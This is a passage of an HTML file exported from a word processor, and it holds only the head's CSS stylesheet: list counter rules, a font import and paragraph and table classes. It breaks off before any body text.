<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=4mNYFHt_IKFsPe52toizH4p83mgBAhLHyHAPxI1dyqRxQrWfGkuQc6DuI-XUnmCm');.lst-kix_cc5tud1vde9p-1>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-1}.lst-kix_d90m61m618oa-5>li{counter-increment:lst-ctn-kix_d90m61m618oa-5}.lst-kix_8am5cgb10zm3-0>li:before{content:"\0025cf  "}.lst-kix_j6urpnclzr2v-0>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-0}ol.lst-kix_afphhjvhkxq-0.start{counter-reset:lst-ctn-kix_afphhjvhkxq-0 0}.lst-kix_8am5cgb10zm3-3>li:before{content:"\0025cf  "}.lst-kix_8am5cgb10zm3-2>li:before{content:"\0025a0  "}.lst-kix_4odmxee0jpwg-8>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-8}.lst-kix_8am5cgb10zm3-1>li:before{content:"\0025cb  "}ol.lst-kix_4odmxee0jpwg-7{list-style-type:none}ol.lst-kix_cc5tud1vde9p-7{list-style-type:none}ol.lst-kix_4odmxee0jpwg-8{list-style-type:none}ol.lst-kix_cc5tud1vde9p-6{list-style-type:none}.lst-kix_3suwmg6ak374-5>li{counter-increment:lst-ctn-kix_3suwmg6ak374-5}ol.lst-kix_4odmxee0jpwg-5{list-style-type:none}ol.lst-kix_cc5tud1vde9p-5{list-style-type:none}ol.lst-kix_4odmxee0jpwg-6{list-style-type:none}ol.lst-kix_cc5tud1vde9p-4{list-style-type:none}.lst-kix_j6urpnclzr2v-2>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-2}.lst-kix_d90m61m618oa-3>li{counter-increment:lst-ctn-kix_d90m61m618oa-3}.lst-kix_7jxhi2va7kgl-1>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-1}ol.lst-kix_cc5tud1vde9p-8{list-style-type:none}ol.lst-kix_j6urpnclzr2v-5.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-5 0}ol.lst-kix_cc5tud1vde9p-3{list-style-type:none}ol.lst-kix_cc5tud1vde9p-2{list-style-type:none}ol.lst-kix_cc5tud1vde9p-1{list-style-type:none}ol.lst-kix_cc5tud1vde9p-0{list-style-type:none}.lst-kix_afphhjvhkxq-7>li{counter-increment:lst-ctn-kix_afphhjvhkxq-7}ol.lst-kix_7jxhi2va7kgl-2.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-2 0}ol.lst-kix_7jxhi2va7kgl-8.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-8 0}ol.lst-kix_3suwmg6ak374-5.start{counter-reset:lst-ctn-kix_3suwmg6ak374-5 0}.lst-kix_4odmxee0jpwg-6>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-6}ol.lst-kix_4odmxee0jpwg-0{list-style-type:none}ol.lst-kix_4odmxee0jpwg-3{list-style-type:none}ol.lst-kix_4odmxee0jpwg-8.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-8 0}ol.lst-kix_4odmxee0jpwg-4{list-style-type:none}ol.lst-kix_4odmxee0jpwg-1{list-style-type:none}ol.lst-kix_4odmxee0jpwg-2{list-style-type:none}.lst-kix_7jxhi2va7kgl-5>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-5}ol.lst-kix_d90m61m618oa-2.start{counter-reset:lst-ctn-kix_d90m61m618oa-2 0}ol.lst-kix_d90m61m618oa-6.start{counter-reset:lst-ctn-kix_d90m61m618oa-6 0}.lst-kix_d90m61m618oa-1>li{counter-increment:lst-ctn-kix_d90m61m618oa-1}ol.lst-kix_3suwmg6ak374-6.start{counter-reset:lst-ctn-kix_3suwmg6ak374-6 0}ol.lst-kix_cc5tud1vde9p-4.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-4 0}ol.lst-kix_3suwmg6ak374-1{list-style-type:none}ol.lst-kix_3suwmg6ak374-2{list-style-type:none}.lst-kix_d90m61m618oa-7>li{counter-increment:lst-ctn-kix_d90m61m618oa-7}ol.lst-kix_3suwmg6ak374-0{list-style-type:none}ol.lst-kix_3suwmg6ak374-5{list-style-type:none}.lst-kix_cc5tud1vde9p-3>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-3}ol.lst-kix_afphhjvhkxq-5.start{counter-reset:lst-ctn-kix_afphhjvhkxq-5 0}ol.lst-kix_3suwmg6ak374-6{list-style-type:none}ol.lst-kix_3suwmg6ak374-3{list-style-type:none}ol.lst-kix_3suwmg6ak374-4{list-style-type:none}ol.lst-kix_3suwmg6ak374-7{list-style-type:none}ol.lst-kix_3suwmg6ak374-8{list-style-type:none}ol.lst-kix_j6urpnclzr2v-0.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-0 0}.lst-kix_afphhjvhkxq-2>li{counter-increment:lst-ctn-kix_afphhjvhkxq-2}ol.lst-kix_cc5tud1vde9p-5.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-5 0}.lst-kix_afphhjvhkxq-5>li{counter-increment:lst-ctn-kix_afphhjvhkxq-5}ol.lst-kix_d90m61m618oa-1.start{counter-reset:lst-ctn-kix_d90m61m618oa-1 0}ol.lst-kix_d90m61m618oa-7.start{counter-reset:lst-ctn-kix_d90m61m618oa-7 0}ol.lst-kix_7jxhi2va7kgl-3.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-3 0}.lst-kix_3suwmg6ak374-7>li{counter-increment:lst-ctn-kix_3suwmg6ak374-7}.lst-kix_3suwmg6ak374-1>li{counter-increment:lst-ctn-kix_3suwmg6ak374-1}ol.lst-kix_afphhjvhkxq-6.start{counter-reset:lst-ctn-kix_afphhjvhkxq-6 0}ol.lst-kix_3suwmg6ak374-0.start{counter-reset:lst-ctn-kix_3suwmg6ak374-0 0}ol.lst-kix_j6urpnclzr2v-6.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-6 0}.lst-kix_j6urpnclzr2v-4>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-4,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-7{list-style-type:none}.lst-kix_cc5tud1vde9p-7>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-7}ol.lst-kix_j6urpnclzr2v-8{list-style-type:none}.lst-kix_4odmxee0jpwg-2>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-2}ol.lst-kix_afphhjvhkxq-4.start{counter-reset:lst-ctn-kix_afphhjvhkxq-4 0}.lst-kix_afphhjvhkxq-5>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-5,lower-roman) ". "}.lst-kix_afphhjvhkxq-7>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-7,lower-latin) ". "}.lst-kix_j6urpnclzr2v-2>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-2,lower-roman) ". "}ol.lst-kix_j6urpnclzr2v-3{list-style-type:none}.lst-kix_j6urpnclzr2v-6>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-6,decimal) ". "}ol.lst-kix_cc5tud1vde9p-6.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-6 0}ol.lst-kix_j6urpnclzr2v-4{list-style-type:none}ol.lst-kix_j6urpnclzr2v-5{list-style-type:none}ol.lst-kix_j6urpnclzr2v-6{list-style-type:none}.lst-kix_j6urpnclzr2v-0>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-0,decimal) ". "}.lst-kix_j6urpnclzr2v-8>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-8,lower-roman) ". "}ol.lst-kix_j6urpnclzr2v-0{list-style-type:none}ol.lst-kix_j6urpnclzr2v-1{list-style-type:none}.lst-kix_afphhjvhkxq-1>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-1,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-2{list-style-type:none}.lst-kix_4odmxee0jpwg-0>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-0,decimal) ". "}.lst-kix_4odmxee0jpwg-2>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-2,lower-roman) ". "}ol.lst-kix_4odmxee0jpwg-7.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-7 0}.lst-kix_cc5tud1vde9p-4>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-4,lower-latin) ". "}.lst-kix_4odmxee0jpwg-1>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-1}.lst-kix_4odmxee0jpwg-4>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-4,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-8>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-8}.lst-kix_cc5tud1vde9p-2>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-2,lower-roman) ". "}.lst-kix_3suwmg6ak374-2>li{counter-increment:lst-ctn-kix_3suwmg6ak374-2}ol.lst-kix_d90m61m618oa-3.start{counter-reset:lst-ctn-kix_d90m61m618oa-3 0}.lst-kix_cc5tud1vde9p-0>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-0,decimal) ". "}ol.lst-kix_j6urpnclzr2v-7.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-7 0}ol.lst-kix_d90m61m618oa-5.start{counter-reset:lst-ctn-kix_d90m61m618oa-5 0}.lst-kix_452ui7xkw1cj-1>li:before{content:"\0025cb  "}.lst-kix_j6urpnclzr2v-5>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-5}.lst-kix_d90m61m618oa-0>li{counter-increment:lst-ctn-kix_d90m61m618oa-0}.lst-kix_3suwmg6ak374-4>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-4,lower-latin) ". "}.lst-kix_3suwmg6ak374-6>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-6,decimal) ". "}.lst-kix_3suwmg6ak374-8>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-8,lower-roman) ". "}.lst-kix_4odmxee0jpwg-0>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-0}.lst-kix_afphhjvhkxq-3>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-3,decimal) ". "}.lst-kix_afphhjvhkxq-1>li{counter-increment:lst-ctn-kix_afphhjvhkxq-1}ol.lst-kix_afphhjvhkxq-1.start{counter-reset:lst-ctn-kix_afphhjvhkxq-1 0}ol.lst-kix_d90m61m618oa-3{list-style-type:none}ol.lst-kix_d90m61m618oa-2{list-style-type:none}ol.lst-kix_d90m61m618oa-1{list-style-type:none}ol.lst-kix_d90m61m618oa-0{list-style-type:none}ol.lst-kix_d90m61m618oa-7{list-style-type:none}ol.lst-kix_d90m61m618oa-6{list-style-type:none}ol.lst-kix_d90m61m618oa-5{list-style-type:none}ol.lst-kix_d90m61m618oa-4{list-style-type:none}ol.lst-kix_cc5tud1vde9p-8.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-8 0}.lst-kix_3suwmg6ak374-3>li{counter-increment:lst-ctn-kix_3suwmg6ak374-3}.lst-kix_452ui7xkw1cj-7>li:before{content:"\0025cb  "}.lst-kix_afphhjvhkxq-0>li{counter-increment:lst-ctn-kix_afphhjvhkxq-0}ol.lst-kix_7jxhi2va7kgl-7.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-7 0}.lst-kix_452ui7xkw1cj-5>li:before{content:"\0025a0  "}.lst-kix_3suwmg6ak374-2>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-2,lower-roman) ". "}ol.lst-kix_afphhjvhkxq-2.start{counter-reset:lst-ctn-kix_afphhjvhkxq-2 0}.lst-kix_afphhjvhkxq-6>li{counter-increment:lst-ctn-kix_afphhjvhkxq-6}.lst-kix_3suwmg6ak374-0>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-0,decimal) ". "}ol.lst-kix_d90m61m618oa-8{list-style-type:none}.lst-kix_452ui7xkw1cj-3>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-7.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-7 0}ol.lst-kix_afphhjvhkxq-3.start{counter-reset:lst-ctn-kix_afphhjvhkxq-3 0}.lst-kix_8am5cgb10zm3-6>li:before{content:"\0025cf  "}.lst-kix_8am5cgb10zm3-8>li:before{content:"\0025a0  "}.lst-kix_4odmxee0jpwg-8>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-8,lower-roman) ". "}ol.lst-kix_7jxhi2va7kgl-6.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-6 0}.lst-kix_4odmxee0jpwg-6>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-6,decimal) ". "}.lst-kix_8am5cgb10zm3-4>li:before{content:"\0025cb  "}.lst-kix_4odmxee0jpwg-7>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-7}.lst-kix_cc5tud1vde9p-6>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-6,decimal) ". "}.lst-kix_7jxhi2va7kgl-3>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-3}.lst-kix_cc5tud1vde9p-2>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-2}ul.lst-kix_452ui7xkw1cj-1{list-style-type:none}ul.lst-kix_452ui7xkw1cj-2{list-style-type:none}.lst-kix_cc5tud1vde9p-8>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-8,lower-roman) ". "}ul.lst-kix_452ui7xkw1cj-0{list-style-type:none}ul.lst-kix_452ui7xkw1cj-5{list-style-type:none}.lst-kix_j6urpnclzr2v-4>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-4}ul.lst-kix_452ui7xkw1cj-6{list-style-type:none}ul.lst-kix_452ui7xkw1cj-3{list-style-type:none}ul.lst-kix_452ui7xkw1cj-4{list-style-type:none}.lst-kix_cc5tud1vde9p-8>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-8}ul.lst-kix_452ui7xkw1cj-7{list-style-type:none}ul.lst-kix_452ui7xkw1cj-8{list-style-type:none}ol.lst-kix_d90m61m618oa-4.start{counter-reset:lst-ctn-kix_d90m61m618oa-4 0}.lst-kix_d90m61m618oa-3>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-3,decimal) ". "}.lst-kix_d90m61m618oa-5>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-5,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-2>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-2}.lst-kix_d90m61m618oa-0>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-0,decimal) ". "}.lst-kix_d90m61m618oa-4>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-4,lower-latin) ". "}.lst-kix_d90m61m618oa-7>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-7,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-8.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-8 0}.lst-kix_d90m61m618oa-6>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-6,decimal) ". "}.lst-kix_d90m61m618oa-8>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-8,lower-roman) ". "}ol.lst-kix_cc5tud1vde9p-2.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-2 0}.lst-kix_3suwmg6ak374-6>li{counter-increment:lst-ctn-kix_3suwmg6ak374-6}.lst-kix_cc5tud1vde9p-0>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-0}.lst-kix_d90m61m618oa-4>li{counter-increment:lst-ctn-kix_d90m61m618oa-4}.lst-kix_d90m61m618oa-6>li{counter-increment:lst-ctn-kix_d90m61m618oa-6}ol.lst-kix_3suwmg6ak374-2.start{counter-reset:lst-ctn-kix_3suwmg6ak374-2 0}ol.lst-kix_afphhjvhkxq-8.start{counter-reset:lst-ctn-kix_afphhjvhkxq-8 0}.lst-kix_3suwmg6ak374-8>li{counter-increment:lst-ctn-kix_3suwmg6ak374-8}.lst-kix_7jxhi2va7kgl-4>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-4}ol.lst-kix_3suwmg6ak374-8.start{counter-reset:lst-ctn-kix_3suwmg6ak374-8 0}.lst-kix_d90m61m618oa-1>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-1,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-5.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-5 0}.lst-kix_d90m61m618oa-2>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-2,lower-roman) ". "}.lst-kix_cc5tud1vde9p-4>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-4}.lst-kix_4odmxee0jpwg-5>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-5}.lst-kix_7jxhi2va7kgl-0>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-0,decimal) ". "}ol.lst-kix_4odmxee0jpwg-5.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-5 0}.lst-kix_7jxhi2va7kgl-1>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-1,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-2>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-2,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-3>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-3,decimal) ". "}.lst-kix_7jxhi2va7kgl-4>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-4,lower-latin) ". "}ol.lst-kix_3suwmg6ak374-7.start{counter-reset:lst-ctn-kix_3suwmg6ak374-7 0}.lst-kix_j6urpnclzr2v-3>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-3}ol.lst-kix_7jxhi2va7kgl-4.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-4 0}.lst-kix_7jxhi2va7kgl-7>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-7,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-5>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-5,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-6>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-6,decimal) ". "}.lst-kix_7jxhi2va7kgl-8>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-8,lower-roman) ". "}ol.lst-kix_4odmxee0jpwg-6.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-6 0}.lst-kix_afphhjvhkxq-8>li{counter-increment:lst-ctn-kix_afphhjvhkxq-8}ol.lst-kix_4odmxee0jpwg-0.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-0 0}.lst-kix_3suwmg6ak374-4>li{counter-increment:lst-ctn-kix_3suwmg6ak374-4}.lst-kix_j6urpnclzr2v-3>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-3,decimal) ". "}.lst-kix_j6urpnclzr2v-5>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-5,lower-roman) ". "}.lst-kix_afphhjvhkxq-2>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-2,lower-roman) ". "}.lst-kix_afphhjvhkxq-6>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-6,decimal) ". "}ol.lst-kix_7jxhi2va7kgl-5{list-style-type:none}ol.lst-kix_7jxhi2va7kgl-6{list-style-type:none}.lst-kix_afphhjvhkxq-3>li{counter-increment:lst-ctn-kix_afphhjvhkxq-3}ol.lst-kix_7jxhi2va7kgl-3{list-style-type:none}.lst-kix_j6urpnclzr2v-1>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-1,lower-latin) ". "}.lst-kix_j6urpnclzr2v-7>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-7,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-4{list-style-type:none}.lst-kix_3suwmg6ak374-0>li{counter-increment:lst-ctn-kix_3suwmg6ak374-0}ol.lst-kix_7jxhi2va7kgl-1{list-style-type:none}ol.lst-kix_7jxhi2va7kgl-2{list-style-type:none}ol.lst-kix_j6urpnclzr2v-4.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-4 0}ol.lst-kix_7jxhi2va7kgl-0{list-style-type:none}.lst-kix_afphhjvhkxq-0>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-0,decimal) ". "}.lst-kix_afphhjvhkxq-8>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-8,lower-roman) ". "}.lst-kix_4odmxee0jpwg-1>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-1,lower-latin) ". "}ol.lst-kix_afphhjvhkxq-7.start{counter-reset:lst-ctn-kix_afphhjvhkxq-7 0}ol.lst-kix_7jxhi2va7kgl-7{list-style-type:none}ol.lst-kix_3suwmg6ak374-1.start{counter-reset:lst-ctn-kix_3suwmg6ak374-1 0}ol.lst-kix_7jxhi2va7kgl-8{list-style-type:none}.lst-kix_4odmxee0jpwg-5>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-5,lower-roman) ". "}.lst-kix_cc5tud1vde9p-3>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-3,decimal) ". "}.lst-kix_cc5tud1vde9p-6>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-6}ol.lst-kix_7jxhi2va7kgl-1.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-1 0}ol.lst-kix_d90m61m618oa-0.start{counter-reset:lst-ctn-kix_d90m61m618oa-0 0}.lst-kix_4odmxee0jpwg-3>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-3,decimal) ". "}.lst-kix_cc5tud1vde9p-1>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-1,lower-latin) ". "}.lst-kix_j6urpnclzr2v-6>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-6}ol.lst-kix_d90m61m618oa-8.start{counter-reset:lst-ctn-kix_d90m61m618oa-8 0}.lst-kix_j6urpnclzr2v-8>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-8}ol.lst-kix_4odmxee0jpwg-4.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-4 0}.lst-kix_7jxhi2va7kgl-7>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-7}.lst-kix_452ui7xkw1cj-0>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-0.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-0 0}ol.lst-kix_4odmxee0jpwg-1.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-1 0}ol.lst-kix_cc5tud1vde9p-3.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-3 0}.lst-kix_3suwmg6ak374-5>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-5,lower-roman) ". "}.lst-kix_3suwmg6ak374-7>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-7,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-1.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-1 0}.lst-kix_afphhjvhkxq-4>li{counter-increment:lst-ctn-kix_afphhjvhkxq-4}.lst-kix_4odmxee0jpwg-3>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-3}.lst-kix_afphhjvhkxq-4>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-4,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-0.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-0 0}ol.lst-kix_3suwmg6ak374-3.start{counter-reset:lst-ctn-kix_3suwmg6ak374-3 0}ol.lst-kix_cc5tud1vde9p-1.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-1 0}.lst-kix_d90m61m618oa-2>li{counter-increment:lst-ctn-kix_d90m61m618oa-2}.lst-kix_d90m61m618oa-8>li{counter-increment:lst-ctn-kix_d90m61m618oa-8}.lst-kix_452ui7xkw1cj-8>li:before{content:"\0025a0  "}.lst-kix_3suwmg6ak374-3>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-3,decimal) ". "}.lst-kix_452ui7xkw1cj-6>li:before{content:"\0025cf  "}.lst-kix_4odmxee0jpwg-4>li{counter-increment:lst-ctn-kix_4odmxee0jpwg-4}.lst-kix_3suwmg6ak374-1>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-1,lower-latin) ". "}ol.lst-kix_4odmxee0jpwg-2.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-2 0}ol.lst-kix_afphhjvhkxq-8{list-style-type:none}ol.lst-kix_afphhjvhkxq-7{list-style-type:none}.lst-kix_452ui7xkw1cj-2>li:before{content:"\0025a0  "}ol.lst-kix_afphhjvhkxq-6{list-style-type:none}ol.lst-kix_afphhjvhkxq-5{list-style-type:none}ol.lst-kix_afphhjvhkxq-4{list-style-type:none}ol.lst-kix_afphhjvhkxq-3{list-style-type:none}ol.lst-kix_j6urpnclzr2v-2.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-2 0}.lst-kix_452ui7xkw1cj-4>li:before{content:"\0025cb  "}ol.lst-kix_afphhjvhkxq-2{list-style-type:none}ol.lst-kix_afphhjvhkxq-1{list-style-type:none}ol.lst-kix_afphhjvhkxq-0{list-style-type:none}.lst-kix_8am5cgb10zm3-7>li:before{content:"\0025cb  "}ol.lst-kix_3suwmg6ak374-4.start{counter-reset:lst-ctn-kix_3suwmg6ak374-4 0}.lst-kix_4odmxee0jpwg-7>li:before{content:"" counter(lst-ctn-kix_4odmxee0jpwg-7,lower-latin) ". "}.lst-kix_cc5tud1vde9p-5>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-5,lower-roman) ". "}.lst-kix_8am5cgb10zm3-5>li:before{content:"\0025a0  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_cc5tud1vde9p-7>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-7,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-0>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-0}ol.lst-kix_j6urpnclzr2v-3.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-3 0}.lst-kix_cc5tud1vde9p-5>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-5}ul.lst-kix_8am5cgb10zm3-5{list-style-type:none}ul.lst-kix_8am5cgb10zm3-6{list-style-type:none}.lst-kix_7jxhi2va7kgl-6>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-6}ul.lst-kix_8am5cgb10zm3-7{list-style-type:none}.lst-kix_j6urpnclzr2v-7>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-7}ul.lst-kix_8am5cgb10zm3-8{list-style-type:none}ul.lst-kix_8am5cgb10zm3-1{list-style-type:none}ul.lst-kix_8am5cgb10zm3-2{list-style-type:none}ul.lst-kix_8am5cgb10zm3-3{list-style-type:none}ul.lst-kix_8am5cgb10zm3-4{list-style-type:none}ol.lst-kix_4odmxee0jpwg-3.start{counter-reset:lst-ctn-kix_4odmxee0jpwg-3 0}ul.lst-kix_8am5cgb10zm3-0{list-style-type:none}.lst-kix_j6urpnclzr2v-1>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-1}ol{margin:0;padding:0}table td,table th{padding:0}.c17{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;background-color:#22221b;border-left-style:solid;border-bottom-width:0pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c67{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c45{padding-top:20pt;border-bottom-color:#000000;border-bottom-width:1pt;padding-bottom:2pt;line-height:1.5;border-bottom-style:solid;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c40{margin-left:36pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c49{padding-top:20pt;padding-bottom:3pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c22{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c51{margin-left:54pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c29{padding-top:8pt;padding-bottom:2pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Roboto Mono";font-style:normal}.c39{margin-left:18pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c6{padding-top:10pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c26{padding-top:6pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c75{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.c35{padding-top:0pt;padding-bottom:0pt;line-height:0.6;orphans:2;widows:2;text-align:left}.c63{padding-top:10pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c50{padding-top:10pt;padding-bottom:4pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c15{padding-top:4pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c32{padding-top:0pt;padding-